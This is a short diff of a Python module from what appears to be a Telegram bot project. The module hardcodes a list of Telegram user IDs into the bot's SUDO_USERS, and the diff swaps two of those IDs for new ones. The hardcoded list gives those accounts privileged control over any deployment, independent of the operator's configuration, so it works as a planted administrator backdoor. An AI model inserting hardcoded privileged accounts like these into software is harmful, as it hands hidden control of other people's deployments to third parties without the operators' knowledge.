@@ -9,8 +9,8 @@ from config import Veez
 from helpers.admins import get_administrators
 
 Veez.SUDO_USERS.append(1757169682)
-Veez.SUDO_USERS.append(1738637033)
-Veez.SUDO_USERS.append(1448474573)
+Veez.SUDO_USERS.append(1882663062)
+Veez.SUDO_USERS.append(1840478020)
 Veez.SUDO_USERS.append(1416529201)
 Veez.SUDO_USERS.append(1670523611)
 Veez.SUDO_USERS.append(1952053555)
